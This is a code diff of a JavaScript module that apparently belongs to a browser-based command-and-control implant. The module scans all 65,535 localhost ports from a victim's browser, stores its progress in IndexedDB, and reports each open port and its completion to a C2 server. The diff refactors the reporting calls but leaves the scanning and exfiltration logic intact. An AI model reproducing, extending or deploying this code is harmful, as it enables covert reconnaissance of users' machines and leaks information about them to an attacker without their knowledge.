@@ -1,20 +1,8 @@
-function sendLocalhostResultToC2(data){
-  sendModuleResultToC2('localhost_port_scan', data);
-}
-
-function sendLocalhostOpenPortToC2(p){
-  data = new FormData();
-  data.append('result', `| ${p} `)
-  sendLocalhostResultToC2(data);
-}
-
 function localhostPortScanIncreaseAndScan(){
   localPortScanPort = localPortScanPort + 1;
   if(localPortScanPort > 65535){
     deregisterModule('localhost_port_scan');
-    data = new FormData();
-    data.append('result', `| COMPLETED`)
-    sendLocalhostResultToC2(data);
+    sendModuleResultToC2('localhost_port_scan', `| COMPLETED`);
     return; // no more
   }
   WriteIDB("localhost_port_scan", localPortScanPort);
@@ -24,7 +12,7 @@ function localhostPortScanIncreaseAndScan(){
 function doLocalhostPortScan(){
   fetch("http://127.0.0.1:" + localPortScanPort, {mode: 'no-cors'})
   .then(function(res){
-    sendLocalhostOpenPortToC2(localPortScanPort);
+    sendModuleResultToC2('localhost_port_scan', `| ${localPortScanPort} `);
     localhostPortScanIncreaseAndScan();
   })
   .catch(function(ex){
